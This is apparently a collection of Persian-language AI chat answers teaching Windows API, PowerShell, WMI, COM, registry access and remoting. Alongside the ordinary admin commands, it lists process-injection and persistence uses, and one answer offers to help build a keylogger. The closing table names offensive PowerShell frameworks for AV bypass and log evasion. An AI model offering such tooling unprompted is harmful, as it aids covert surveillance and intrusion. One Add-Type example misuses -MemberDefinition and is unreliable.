Windows API یعنی «رابطی که ویندوز در اختیار برنامه‌ها می‌ذاره تا بتونن با خودش ارتباط برقرار کنن».

---

## 📌 مثال‌هایی از Windows API Calls

|API Call|کاربرد|توضیح|
|---|---|---|
|`CreateFile`|باز کردن یا ساختن فایل|برای کار با فایل‌ها استفاده می‌شه|
|`WriteProcessMemory`|نوشتن در حافظه‌ی یک پروسس|در ابزارهای هک یا دیباگر کاربرد داره|
|`OpenProcess`|دسترسی به یک پروسس دیگر|لازمه برای مهندسی معکوس یا مانیتورینگ|
|`VirtualAlloc`|رزرو حافظه در RAM|برای اجرای شل‌کدها و مدیریت حافظه|
|`CreateRemoteThread`|اجرای کد در یک پروسس دیگر|در Inject کردن DLL یا شل‌کد استفاده می‌شه|
|`RegSetValueEx`|نوشتن در رجیستری|برای پیکربندی سیستم یا ماندگاری (persistence)|

---

## 🛠️ چرا برنامه‌نویس‌ها از Windows API استفاده می‌کنن؟

|دلیل|توضیح|
|---|---|
|🔹 سطح کنترل بالا|APIهای ویندوز مستقیماً با هسته‌ی سیستم‌عامل کار می‌کنن|
|🔹 قدرت بیشتر نسبت به توابع معمولی|مثلاً می‌تونی تو حافظه‌ی پروسس‌های دیگه بنویسی|
|🔹 انجام کارهایی که در C# یا Python به تنهایی نمی‌شه|مثل inject کردن، اجرای شل‌کد، باز کردن دسته‌های مخفی (handle)،...|
|🔹 ساخت ابزارهای امنیتی یا بدافزار|ابزارهایی مثل keylogger، rootkit، injector، مانیتورینگ سیستم و... اغلب از Windows API استفاده می‌کنن|
|🔹 ابزارهای تحلیل امنیت|مانند Sysmon، Process Hacker، Wireshark هم با API سر و کار دارن|

---

## 🎯 کجاها زیاد با API سروکار داریم؟

- برنامه‌نویسی با زبان‌هایی مثل C و ++C
    
- توسعه‌ی ابزارهای امنیتی یا ضدبدافزار
    
- مهندسی معکوس (Reverse Engineering)
    
- تست نفوذ (خصوصاً حملات سطح سیستم)
    
- توسعه ابزارهای سطح پایین ویندوز
    

---

## 🧠 مثال خیلی ساده در C:

```c
#include <windows.h>

int main() {
    MessageBoxA(0, "سلام مارتین", "عنوان", MB_OK);
    return 0;
}
```

این یه API call به `MessageBoxA` هست که پیام نشون می‌ده.

---

## ❗ امنیت و Windows API

از دید امنیتی:

- اجرای مشکوک APIهایی مثل `WriteProcessMemory`, `CreateRemoteThread`, یا `VirtualAllocEx` معمولاً نشونه حمله یا بدافزاره
    
- SIEMها و EDRها اغلب این تماس‌ها رو بررسی می‌کنن
    

---

## 🧩 جمع‌بندی

|موضوع|توضیح|
|---|---|
|Windows API|مجموعه‌ای از توابع برای ارتباط مستقیم با ویندوز|
|کاربرد|تعامل با فایل‌ها، پروسس‌ها، شبکه، رجیستری و حافظه|
|زبان‌ها|بیشتر در C/C++ استفاده می‌شه، ولی از C#, Python هم می‌تونن صداش بزنن|
|اهمیت امنیتی|پایه‌ی بسیاری از حملات و دفاع‌هاست|

---
[اگه دوست داری با APIهای خاص کار کنیم (مثلاً: ساخت keylogger ساده، مانیتورینگ پروسس‌ها، اجرای DLL در پروسس دیگر)، فقط بگو تا شروع کنیم. 💪](<عالیه مارتین! 🌟  
حالا بریم سراغ یکی از **قدرتمندترین ویژگی‌های** دستور `Add-Type` در پاورشل:

---

## ✅ `-MemberDefinition` در `Add-Type` چیه؟

```powershell
Add-Type -MemberDefinition "%3Cکد C#%3E" -Name "<نام کلاس>" -Namespace "<فضای نام>"
```

### 🧠 تعریف ساده:
`-MemberDefinition` این امکان رو بهت می‌ده که **مستقیم توی خود PowerShell کد C# بنویسی** و اونو کامپایل و استفاده کنی — بدون اینکه فایل `.cs` یا `.dll` جدا بسازی.

---

## 🎯 چرا این خیلی مفیده؟

- لازم نیست پروژه C# بسازی
- کد رو درجا داخل PowerShell می‌نویسی
- کلاس‌ها و متدهایی می‌سازی که تو اسکریپتت استفاده کنی
- برای کارهای پیشرفته (مثل رمزنگاری، API، توابع سفارشی) عالیه

---

## 📌 ساختار کلی:

```powershell
Add-Type -TypeDefinition @"
public class MyClass {
    public static string SayHi(string name) {
        return "Hello, " + name;
    }
}
"@ -Language CSharp -Name MyClass -Namespace MyNamespace -PassThru
```

یا ساده‌تر:

```powershell
Add-Type -MemberDefinition 'public static string Hello() { return "Hi!"; }' -Name Test -Namespace MySpace -PassThru
```

---

## ✅ مثال واقعی — ساده

```powershell
$myClass = Add-Type -MemberDefinition @"
public class Greeter {
    public static string SayHello(string name) {
        return "سلام " + name;
    }
}
"@ -Name Greeter -Namespace MyCode -PassThru

# حالا استفاده ازش
$myClass::SayHello("مارتین")
```

### خروجی:
```
سلام مارتین
```

---

## 🔍 فرقش با `-Path` یا `-AssemblyName`

| روش | منبع کد | نیاز به فایل؟ | مناسب برای |
|------|-----------|----------------|--------------|
| `-Path` | DLL خارجی | ✅ بله | وقتی DLL از قبل داری |
| `-AssemblyName` | از GAC | ✅ بله | برای کتابخانه‌های .NET رسمی |
| `-MemberDefinition` | کد C# خام | ❌ نه | وقتی می‌خوای سریع کدی بنویسی داخل اسکریپت PowerShell |

---

## 📦 کاربردهای جالب `-MemberDefinition`

- نوشتن کلاس رمزنگاری سفارشی
- فراخوانی توابع Windows API
- ساخت کدهای پیچیده C# بدون خروج از PowerShell
- ایجاد انواع داده‌ی سفارشی

---

## 🛠️ جمع‌بندی

| ویژگی | توضیح |
|--------|--------|
| `-MemberDefinition` | اجازه می‌ده کد C#/VB.NET رو مستقیم در PowerShell بنویسی |
| استفاده | بدون DLL یا فایل خارجی |
| کاربرد | متدهای سفارشی، کلاس‌های فوری، ترکیب با کد .NET |
| مزیت | سریع، قدرتمند، بدون نیاز به محیط برنامه‌نویسی جدا |

---

---

## ✅ تعریف دقیق‌تر:

> **WMI (Windows Management Instrumentation)** یک چارچوب (Framework) در ویندوز است که امکان **دسترسی، مانیتورینگ و کنترل اجزای سیستم‌عامل** را از طریق یک **مدل شیء‌گرا (Object Model)** فراهم می‌کند.  
> این کار بدون نیاز به رابط گرافیکی و فقط با استفاده از **کد یا اسکریپت** انجام می‌گیرد.

---

## ✅ ابزارهایی که با WMI کار می‌کنن:

|ابزار|توضیح|
|---|---|
|**PowerShell**|محبوب‌ترین روش مدرن برای تعامل با WMI (`Get-WmiObject`, `Invoke-WmiMethod`, ...)|
|**wmic.exe**|ابزار قدیمی‌تر خط فرمان (در ویندوز 11 حذف شده)|
|**C++ / C#**|می‌تونی مستقیماً با APIها به `IWbemServices` و `COM` متصل بشی|
|**WMI Explorer**|ابزار گرافیکی برای مشاهده کلاس‌ها و اجرای WQL Query|
|**VBScript**|در اسکریپت‌های قدیمی زیاد استفاده می‌شه|

---

## ✅ ساختار WMI چطوریه؟

WMI از **کلاس‌ها (Classes)** تشکیل شده، که داخل **Namespace**هایی قرار دارن.  
مثلاً:

- کلاس: `Win32_Process`
    
- کلاس: `Win32_OperatingSystem`
    
- کلاس: `Win32_Service`
    

همه این‌ها داخل Namespace مثلاً `root\cimv2` هستن.

---

## ✅ مثال از PowerShell (دسترسی به یک شی WMI)

```powershell
Get-WmiObject -Class Win32_BIOS
```

این دستور شی `Win32_BIOS` رو از WMI می‌گیره و اطلاعات BIOS رو بهت نشون می‌ده.  
نه رابط گرافیکی هست، نه پنجره Control Panel — فقط دسترسی مستقیم به اطلاعات از هسته ویندوز.

---

## ✅ جمع‌بندی جمله‌ات به شکل حرفه‌ای:

> "WMI یک زیرساخت شی‌گرا در ویندوز است که اجازه می‌دهد اجزای سیستم‌عامل را بدون نیاز به رابط گرافیکی و از طریق ابزارهایی مانند PowerShell یا wmic کنترل یا مانیتور کنیم."

---
حتماً آمین! 😎  
الان با هم می‌ریم سراغ چند دستور WMI در پاورشل (PowerShell) که با استفاده از `Get-WmiObject` و `Invoke-WmiMethod` بتونی:

- پروسه‌ها رو **لیست** کنی  
- یک پروسه خاص رو **پیدا کنی**  
- یک پروسه **اجرا** کنی  
- یک پروسه **ببندی**

و همه اینا فقط با WMI، بدون GUI، حتی از راه دور هم می‌تونه انجام بشه.

---

## ✅ ۱. لیست همه پروسه‌ها

```powershell
Get-WmiObject -Class Win32_Process
```

> این دستور تمام پروسه‌های در حال اجرا رو از کلاس `Win32_Process` در WMI می‌گیره.

---

## ✅ ۲. پیدا کردن یک پروسه خاص (مثلاً notepad)

```powershell
Get-WmiObject -Class Win32_Process | Where-Object { $_.Name -eq "notepad.exe" }
```

> اینجا از `Where-Object` استفاده کردیم که فیلتر کنه فقط پروسه‌هایی با نام `notepad.exe`.

---

## ✅ ۳. اجرای یک برنامه (مثلاً Notepad)

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe"
```

> این دستور دقیقاً معادل اجرای `notepad.exe` هست، ولی از طریق WMI انجام می‌شه.

---

## ✅ ۴. بستن یک پروسه (مثلاً notepad)

```powershell
$proc = Get-WmiObject -Class Win32_Process | Where-Object { $_.Name -eq "notepad.exe" }
$proc.Terminate()
```

> با این کد:
- ابتدا پروسه notepad پیدا می‌شه
- سپس متد `Terminate()` از کلاس WMI صدا زده می‌شه تا پروسه بسته بشه

or next | remove-wmiobject 

---

## ✅ ۵. گرفتن نام پروسه و PID فقط

```powershell
Get-WmiObject -Class Win32_Process | Select-Object Name, ProcessId
```

> برای دیدن خلاصه‌ای از پروسه‌ها

---

## ✅ ۶. اجرای برنامه در یک سیستم راه دور (اگه مجوز داری):

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "TargetPC"
```

> این دستور ماشین حساب رو روی یک سیستم دیگه اجرا می‌کنه (اگه دسترسی مدیریتی داشته باشی)

---

## 🧠 نکته امنیتی:

این کارها همه از طریق WMI انجام می‌شن، و اگر کسی این دستورات رو بدون اطلاع مدیر اجرا کنه، می‌تونه یه جور حمله محسوب بشه. EDRها معمولاً دستورات WMI رو لاگ می‌کنن یا حتی بهش هشدار می‌دن.

---

## 🎯 اگر بخوای WMI رو به شکل حرفه‌ای یاد بگیری:

- `Get-WmiObject` → گرفتن اطلاعات  
- `Invoke-WmiMethod` → اجرای عملیات روی کلاس‌ها  
- `Register-WmiEvent` → ساخت Eventهای دائمی (برای Persistence هم استفاده می‌شه)

---

---

## 🧩 اول از همه: **Component یعنی چی؟**

کلمه‌ی **Component** در زبان انگلیسی یعنی:

%3E "جزء"، "قطعه"، یا "بخشی از یک سیستم بزرگ‌تر"

در مهندسی نرم‌افزار:

> **Component یعنی یک بخش قابل‌استفاده‌ی مجدد از یک برنامه که می‌تونه به‌طور مستقل ساخته و استفاده بشه.**

---

## ✅ تعریف کامل‌تر (در مهندسی نرم‌افزار):

> یک **کامپوننت** یک **ماژول کپسوله‌شده** است که یک یا چند **قابلیت (functionality)** مشخص رو ارائه می‌ده، و از طریق **رابط‌هایی (interfaces)** می‌شه باهاش ارتباط برقرار کرد.

---

### 📌 مثال ساده:

فرض کن داری یه برنامه حسابداری می‌نویسی:

* بخش محاسبه مالیات → یک کامپوننت
* بخش صدور فاکتور PDF → یک کامپوننت
* بخش لاگین و ثبت‌نام → یک کامپوننت

همه اینا بخش‌هایی از یک برنامه هستن، ولی **قابل تفکیک، توسعه جداگانه و استفاده‌ی مجدد** هستن.

---

## 🏛️ حالا برگردیم به COM: Component Object Model

وقتی مایکروسافت اومد این مدل رو تعریف کرد، گفت:

> "بیایم اجزای نرم‌افزار رو به شکل کامپوننت‌های مستقل بسازیم که بتونن با هم حرف بزنن."

✅ ویژگی‌های اصلی کامپوننت‌های COM:

| ویژگی                        | توضیح                                                |
| ---------------------------- | ---------------------------------------------------- |
| قابل استفاده مجدد (Reusable) | یک بار نوشته می‌شه، تو چند برنامه استفاده می‌شه      |
| مستقل از زبان برنامه‌نویسی   | می‌تونی تو C بنویسی و تو VB یا Python استفاده کنی    |
| دارای Interface              | باید روش مشخصی برای ارتباط باهاش داشته باشه          |
| قابل ثبت در ویندوز           | تو رجیستری ویندوز ثبت می‌شه و بقیه می‌تونن پیداش کنن |

---

## 🧠 چرا اسمش "Component Object Model" هست؟

* **Component** → ماژول قابل استفاده مجدد (مثلاً `Excel.Application`)
* **Object** → هر کامپوننت در قالب یک شیء ارائه می‌شه (Object-oriented)
* **Model** → یک مدل قراردادی برای اینکه برنامه‌ها بتونن از این اشیاء استفاده کنن

---

## 🧪 وقتی تو می‌نویسی:

```powershell
New-Object -ComObject "Scripting.FileSystemObject"
```

در واقع داری از یک **کامپوننت رجیسترشده در ویندوز** استفاده می‌کنی که وظیفه‌اش دسترسی به فایل‌هاست.

اون "Scripting.FileSystemObject" یه Component هست که قبلاً نوشته، کامپایل و ثبت شده، و الان از طریق PowerShell یا حتی جاوااسکریپت یا Python قابل استفاده‌ست.

---

## 🔩 COM در سیستم‌عامل ویندوز یعنی چی؟

در ویندوز، کامپوننت‌ها معمولاً به صورت DLLهایی هستن که:

* در رجیستری ویندوز ثبت می‌شن (با `CLSID`)
* می‌تونن بارها توسط برنامه‌های مختلف استفاده بشن
* از طریق COM یا DCOM (نسخه‌ی ریموت) فراخوانی می‌شن

مثلاً:

| کامپوننت            | کاربرد                                                  |
| ------------------- | ------------------------------------------------------- |
| `WScript.Shell`     | اجرای برنامه، ساخت Shortcut، دستورات registry           |
| `Excel.Application` | کار با فایل‌های اکسل                                    |
| `Shell.Application` | تعامل با Windows Explorer                               |
| `MMC20.Application` | مدیریت کنسول ویندوز (برای Persistence هم استفاده می‌شه) |

---

## 🔥 نکته امنیتی خیلی مهم:

کامپوننت‌های COM به‌دلیل **قدیمی بودن، عدم محدودیت، و اجرای مستقیم کد در حافظه**، یکی از محبوب‌ترین راه‌های **حمله‌ی فایل‌لس (fileless attacks)** هستن.

مهاجم ممکنه فقط با اجرای یک دستور COM، بدون نوشتن هیچ فایلی، کد مخرب اجرا کنه.

---

## 🎯 جمع‌بندی حرفه‌ای:

| واژه                             | تعریف                                                                         |
| -------------------------------- | ----------------------------------------------------------------------------- |
| **Component**                    | بخش مستقل و قابل استفاده مجدد از نرم‌افزار                                    |
| **COM (Component Object Model)** | چارچوبی در ویندوز برای استفاده از این Componentها در قالب اشیاء قابل فراخوانی |
| **COM Object**                   | شیء واقعی ساخته‌شده از یک Component رجیسترشده                                 |
| **مزیت**                         | اشتراک‌گذاری قابلیت بین برنامه‌ها، صرف‌نظر از زبان و پیاده‌سازی               |
| **خطر**                          | اجرای کد بدون فایل، پنهان‌کاری، Persistence در حملات                          |

---
آفرین مارتین جان 🌟  
اگه می‌خوای از طریق **PowerShell** محتویات **رجیستری (Registry)** رو ببینی و باهاش کار کنی، PowerShell ابزار قدرتمندی داره که خیلی راحت‌تر و دقیق‌تر از CMD عمل می‌کنه.

---

## ✅ مثال‌هایی برای مشاهده محتوای رجیستری در PowerShell

### 1. 📂 دیدن کلیدهای داخل یک مسیر

```powershell
Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"
```

> `HKLM` مخفف `HKEY_LOCAL_MACHINE` هست  
> از `HKCU` هم می‌تونی استفاده کنی برای `HKEY_CURRENT_USER`

---

### 2. 📄 دیدن مقادیر (Values) داخل یک کلید

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"
```

> خروجی شامل تمام مقادیر (name, type, data) کلید هست.

---

### 3. 🔍 جستجوی یک مقدار خاص

```powershell
(Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion").ProgramFilesDir
```

> فقط مقدار `ProgramFilesDir` رو می‌گیره.

---

### 4. 🛠 ساختن کلید و مقدار

```powershell
New-Item -Path "HKCU:\Software\CharonSoft"
New-ItemProperty -Path "HKCU:\Software\CharonSoft" -Name "TestKey" -Value "HelloWorld" -PropertyType String
```

---

### 5. ❌ حذف مقدار یا کلید

```powershell
Remove-ItemProperty -Path "HKCU:\Software\CharonSoft" -Name "TestKey"
Remove-Item -Path "HKCU:\Software\CharonSoft" -Recurse
```

---

### 6. 👁 باز کردن ریشه‌های دیگر رجیستری

|Root Name (PowerShell)|Full Registry Name|
|---|---|
|HKLM:\|HKEY_LOCAL_MACHINE|
|HKCU:\|HKEY_CURRENT_USER|
|HKCR:\|HKEY_CLASSES_ROOT|
|HKU:\|HKEY_USERS|
|HKCC:\|HKEY_CURRENT_CONFIG|

---

### 💡 ترفند: تبدیل مسیر رجیستری به PowerShell Path

مثلاً اگر در رجیستری این مسیر رو دیدی:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager
```

در PowerShell باید به این صورت بنویسی:

```powershell
HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager
```

---
دستور `Get-Item` یکی از **cmdlet**‌های پایه در PowerShell هست و برای **گرفتن یک آیتم خاص (فایل، پوشه، رجیستری، گواهی‌نامه و...) در مسیر مشخص** استفاده میشه.

---

### 🧠 تعریف ساده:

> 📌 `Get-Item` = گرفتن اطلاعات درباره‌ی یک **آیتم واحد** از مسیر مشخص (نه لیست کل آیتم‌ها)

---

### 📁 فرقش با `Get-ChildItem` چیه؟

- 🔹 `Get-Item` → فقط **همون آیتم مشخص‌شده** رو برمی‌گردونه
    
- 🔸 `Get-ChildItem` → تمام آیتم‌های **داخل یک مسیر (فولدر)** رو برمی‌گردونه (مشابه `ls` در لینوکس یا `dir` در CMD)
    

---

### ✅ مثال‌ها:

#### 1. گرفتن اطلاعات یک فایل:

```powershell
Get-Item C:\Users\Martin\Desktop\notes.txt
```

📌 خروجی:

- نام فایل
    
- مسیر
    
- سایز
    
- تاریخ ایجاد
    
- تاریخ آخرین تغییر
    
- نوع (FileInfo object)
    

---

#### 2. گرفتن اطلاعات یک فولدر:

```powershell
Get-Item "C:\Program Files"
```

🔹 این فقط اطلاعات پوشه‌ی `Program Files` رو می‌ده، نه فایل‌های داخلش.

---

#### 3. استفاده با رجیستری:

```powershell
Get-Item "HKLM:\Software\Microsoft\Windows\CurrentVersion"
```

📌 آیتمی در رجیستری ویندوز.

---

#### 4. بررسی آیا فایل خاصی وجود دارد یا نه:

```powershell
if (Get-Item "C:\important\backup.zip" -ErrorAction SilentlyContinue) {
    Write-Output "فایل پیدا شد"
} else {
    Write-Output "فایل وجود ندارد"
}
```

---

### 🧰 موارد کاربردی:

|کاربرد|توضیح|
|---|---|
|چک‌کردن وجود فایل یا پوشه|با `if` یا `Test-Path` ترکیب میشه|
|گرفتن مشخصات یک فایل|سایز، تاریخ، مالک|
|استفاده در اسکریپت‌ها|برای بررسی خاص بودن یک آیتم خاص|

---


دستور `Get-PSProvider` در PowerShell یکی از ابزارهای پایه‌ای ولی بسیار مهمه برای درک **زیرساخت PowerShell**.

---

### 🧠 تعریف ساده:

> 📌 `Get-PSProvider` = نمایش لیست همه‌ی **Providerهای PowerShell** که به PowerShell اجازه میدن با منابع مختلف (مثل فایل‌ها، رجیستری، گواهی‌نامه‌ها و...) کار کنه **مثل اینکه با فایل‌سیستم کار می‌کنی**.

---

### 🧩 PowerShell Provider چیه؟

🔸 **PSProvider**ها یک جور رابط (interface) هستن که به PowerShell امکان میدن با منابع مختلف (غیرفایل‌سیستم) **مثل فایل‌سیستم رفتار کنه**.

یعنی تو می‌تونی به رجیستری، گواهی‌ها، متغیرها و ... مثل پوشه‌ها و فایل‌ها دسترسی داشته باشی.

---

### 📜 خروجی `Get-PSProvider` چیا رو نشون می‌ده؟

یک لیست از Providerهای فعال در سیستم، مثل:

|Name|Drives|Capabilities|Description|
|---|---|---|---|
|FileSystem|C, D|ShouldProcess|فایل‌ها و پوشه‌ها|
|Registry|HKLM, HKCU|ShouldProcess|رجیستری ویندوز|
|Certificate|Cert|ShouldProcess|گواهی‌های دیجیتال|
|Environment|Env|None|متغیرهای محیطی (Environment Variables)|
|Variable||None|متغیرهای PowerShell|
|Alias||None|aliasهای دستوری|
|Function||None|توابع تعریف‌شده|

---

### ✅ مثال کاربردی:

#### 1. اجرای دستور:

```powershell
Get-PSProvider
```

📌 خروجی نشون می‌ده چه Providerهایی در سیستم فعال هستن و هر کدوم به چه "Drive"هایی متصل هستن.

---

### 📁 مثال‌های عملی از استفاده Providerها:

#### فایل‌سیستم:

```powershell
Set-Location C:
Get-ChildItem
```

#### رجیستری (Registry):

```powershell
Set-Location HKLM:\Software
Get-ChildItem
```

#### گواهی‌نامه‌ها (Certificates):

```powershell
Set-Location Cert:\LocalMachine\Root
Get-ChildItem
```

#### متغیر محیطی:

```powershell
Get-ChildItem Env:
```

---

### 🧠 نتیجه‌گیری:

`Get-PSProvider` بهت می‌گه PowerShell **با چه نوع منابعی می‌تونه رفتار فایل‌سیستمی داشته باشه**.  
این باعث می‌شه ابزار خیلی قدرتمندی بشه برای کار با منابع سیستم عامل، حتی اگر اون‌ها فایل نباشن.

---
سؤال دقیقی پرسیدی مارتین 👌  
بیایم گام‌به‌گام بررسی کنیم که دستور:

```powershell
Get-PSProvider -PSProvider ...
```

دقیقاً **چی هست و چه زمانی استفاده میشه**.

---

### 🧠 اول از همه: دستور پایه چیه؟

```powershell
Get-PSProvider
```

این دستور همه‌ی Providerهای فعال در PowerShell رو نشون می‌ده.

---

### ❓ حالا سوییچ `-PSProvider` چیه؟

اینجا یک نکته خیلی مهم هست:

> 📛 در واقع، **`-PSProvider`** یک پارامتر برای `Get-PSDrive` هست، **نه برای `Get-PSProvider`**.

به عبارت ساده‌تر:

```powershell
Get-PSProvider -PSProvider ...
```

✅ از نظر دستوری **اشتباهه** چون `Get-PSProvider` چنین پارامتری نداره.  
اگر بزنی، PowerShell این خطا رو می‌ده:

```powershell
Get-PSProvider : A parameter cannot be found that matches parameter name 'PSProvider'.
```

---

### ✅ کاربرد درست `-PSProvider` کجاست؟

در دستور:

```powershell
Get-PSDrive -PSProvider FileSystem
```

در اینجا:

- `Get-PSDrive` لیست درایوهای موجود در PowerShell رو نشون می‌ده.
    
- با `-PSProvider` می‌تونی فقط درایوهای مربوط به یک Provider خاص رو فیلتر کنی.
    

مثلاً:

|دستور|نتیجه|
|---|---|
|`Get-PSDrive -PSProvider FileSystem`|فقط درایوهای فایل‌سیستم (مثل C:\، D:\ و ...) رو نشون می‌ده|
|`Get-PSDrive -PSProvider Registry`|فقط درایوهای رجیستری رو نشون می‌ده (مثل HKLM:\ یا HKCU:)|

---

### 🔧 پس جمع‌بندی:

|دستور|توضیح|
|---|---|
|`Get-PSProvider`|لیست همه Providerها (فایل‌سیستم، رجیستری، متغیرها و...)|
|❌ `Get-PSProvider -PSProvider ...`|**اشتباه** است، چون پارامتر `-PSProvider` مربوط به این cmdlet نیست|
|✅ `Get-PSDrive -PSProvider FileSystem`|کاربرد درست برای فیلتر کردن درایوهای خاص بر اساس Provider|

---

عالیه که به این دقت توجه کردی، مارتین 👀  
تفاوت بین `Get-Item` و `Get-ItemProperty` توی PowerShell خیلی مهمه، به‌ویژه وقتی داری با فایل‌ها یا رجیستری کار می‌کنی.  
بذار خیلی شفاف و با مثال توضیح بدم:

---

## 🔍 تفاوت کلی:

|Cmdlet|کار اصلی|نوع اطلاعات|
|---|---|---|
|`Get-Item`|فقط خود آیتم رو میاره|اطلاعات پایه (مثلاً مسیر، نوع، اندازه، زمان ساخت و...)|
|`Get-ItemProperty`|**ویژگی‌های (Propertyهای) داخل اون آیتم** رو میاره|مثلاً مقدار کلیدهای رجیستری یا متغیرهای محیطی|

---

## 🧪 بیایم با مثال فرق رو ببینیم:

### 🧾 مثال ۱: کار با فایل

#### 🔸 `Get-Item`

```powershell
Get-Item "C:\Users\Martin\Desktop\notes.txt"
```

📌 خروجی:

- مسیر فایل
    
- تاریخ ساخت
    
- اندازه
    
- نوع فایل
    

#### 🔸 `Get-ItemProperty`

```powershell
Get-ItemProperty "C:\Users\Martin\Desktop\notes.txt"
```

📌 خروجی:

- علاوه بر اطلاعات بالا، ممکنه بعضی **ویژگی‌های خاص فایل یا فایل‌های خاص مثل فایل .lnk یا .exe** رو بده (مثلاً version info)
    

---

### 🧾 مثال ۲: کار با رجیستری (خیلی مهم)

#### 🔸 `Get-Item`

```powershell
Get-Item "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"
```

📌 خروجی:

- اطلاعات عمومی اون کلید (مثل مسیر، نوعش که RegistryKey هست)
    

#### 🔸 `Get-ItemProperty`

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"
```

📌 خروجی:

- تمام **مقادیر** (Values) داخل اون کلید رجیستری:
    
    - ProgramFilesDir
        
    - CommonFilesDir
        
    - DevicePath
        
    - ...
        

🎯 **اینجاست که `Get-ItemProperty` واقعاً کاربردی میشه!**

---

## 🔧 خلاصه کاربردها:

|Cmdlet|چه زمانی استفاده کنیم؟|
|---|---|
|`Get-Item`|وقتی می‌خوای خود آیتم (فایل، پوشه، کلید رجیستری) رو بشناسی|
|`Get-ItemProperty`|وقتی می‌خوای **محتوای درونی** اون آیتم رو ببینی، مثل مقادیر رجیستری یا ویژگی فایل‌ها|

---

## 🧠 یه تشبیه ساده:

فرض کن آیتم یه "کمد" باشه:

- 🟩 `Get-Item` → فقط در کمد رو نگاه می‌کنی: جنسش چیه؟ کجاست؟ درش قفله؟
    
- 🟨 `Get-ItemProperty` → در کمد رو باز می‌کنی و **می‌فهمی توش چیا هست** (لباس؟ کتاب؟...)
    

---

خیلی سؤال خوبی پرسیدی مارتین 👏  
اگر بخوای از طریق **PowerShell ریموت** بری سراغ رجیستری یک سیستم دیگه و محتوای یه کلید خاص رو بخونی، باید از `Invoke-Command` استفاده کنی همراه با `Get-Item` یا `Get-ItemProperty`.

---

## ✅ سناریو: دیدن محتوای رجیستری روی سیستم ریموت

فرض کنیم:

- اسم سیستم ریموت هست: `PC-Target`
    
- می‌خوای محتوای کلید زیر رو ببینی:
    

```powershell
HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion
```

---

## 🔹 دستور پایه:

```powershell
Invoke-Command -ComputerName PC-Target -ScriptBlock {
    Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion'
}
```

📌 این دستور محتوای کلید مورد نظر رو از رجیستری `PC-Target` برمی‌گردونه.

---

## 🛡️ نکات مهم برای اینکه کار کنه:

|شرط|توضیح|
|---|---|
|💠 WinRM باید روی سیستم ریموت فعال باشه|با دستور `Enable-PSRemoting` فعال میشه|
|💳 دسترسی ادمین باید داشته باشی|چون رجیستری در `HKLM` نیاز به دسترسی بالا داره|
|🔐 ممکنه نیاز باشه از `-Credential` استفاده کنی|برای احراز هویت در محیط دامین یا کاربر ریموت|

---

## 🧪 مثال با احراز هویت:

```powershell
$cred = Get-Credential

Invoke-Command -ComputerName PC-Target -Credential $cred -ScriptBlock {
    Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion'
}
```

---

## 🧠 اگه بخوای فقط یک مقدار خاص رو بگیری:

مثلاً مقدار `ProgramFilesDir` رو فقط بخوای:

```powershell
Invoke-Command -ComputerName PC-Target -ScriptBlock {
    (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion').ProgramFilesDir
}
```

---

## 🔧 اگر بخوای تغییر هم بدی:

تغییر مقدار در رجیستری ریموت هم ممکنه:

```powershell
Invoke-Command -ComputerName PC-Target -ScriptBlock {
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\MyApp' -Name 'Version' -Value '2.0'
}
```

---

## 📁 اگر بخوای `HKCU` بخونی چی؟

برای `HKCU:\` باید بدونی این مسیر **برای کاربر جاری در Session ریموت** هست.  
و چون PowerShell Remoting به‌صورت **non-interactive** اجرا میشه، ممکنه `HKCU:\` خالی باشه یا مربوط به کاربر SYSTEM بشه.

✅ راه‌حل دقیق‌تر: استفاده از SID در `HKEY_USERS` به‌جای `HKCU`.

مثال:

```powershell
Invoke-Command -ComputerName PC-Target -ScriptBlock {
    Get-ItemProperty -Path 'HKU\S-1-5-21-...-...\SOFTWARE\Policies\Microsoft\Windows NT\Driver Signing'
}
```

---

حتماً! اینم یه لیست کامل و دسته‌بندی‌شده از **فریمورک‌ها و ابزارهای PowerShell در حوزه Offensive Security** که در تست نفوذ (به‌ویژه Red Team و Fileless Attackها) استفاده می‌شن:

---

## 🎯 فریمورک‌های Offensive مبتنی بر PowerShell

|نام فریمورک|توضیح مختصر|وضعیت|
|---|---|---|
|**Nishang**|شامل مجموعه‌ای از اسکریپت‌های PowerShell برای recon، shell، exfiltration، persistence و...|✅ فعال|
|**PowerSploit**|مجموعه‌ای بزرگ از ماژول‌ها برای exploitation، privilege escalation، bypass AV و...|✅ فعال (ولی آپدیت کمتر)|
|**Empire**|Command & Control framework قدرتمند با استفاده از PowerShell (پشتیبانی از payloadهای fileless)|⚠️ توسعه اصلی متوقف، ولی **Empire 4.x** فعال|
|**PowerSharpPack**|ابزارهای Fileless برای اجرای حملات با استفاده از PowerShell Reflective Injection|✅ فعال|
|**Pupy**|RAT با پشتیبانی از PowerShell به عنوان transport و loader|⚠️ چندمنظوره (نه صرفاً PS)|
|**Powercat**|کلاینت و سرور Netcat مانند با PowerShell، پشتیبانی از reverse/bind shell|✅ سبک و فعال|
|**PoshC2**|فریمورک C2 (Command and Control) مدرن که از PowerShell برای agent استفاده می‌کند|✅ توسعه فعال|
|**Unicorn**|تولید payloadهای PowerShell با کدهای base64 شده (برای bypass AV)|✅ ابزار مکمل|
|**InvisiShell**|اجرای کدهای PowerShell به‌صورت **کاملاً مخفیانه** بدون لاگ شدن (ضد forensic)|⚠️ نیازمند تست بیشتر|
|**Powershell Empire-Evasion**|مجموعه تکنیک‌های دور زدن AV برای اسکریپت‌های PowerShell|⚠️ تکمیلی برای Empire|
|**PowerUp**|ماژول privilege escalation از PowerSploit برای ویندوز|✅ مفید در ارتقا دسترسی|
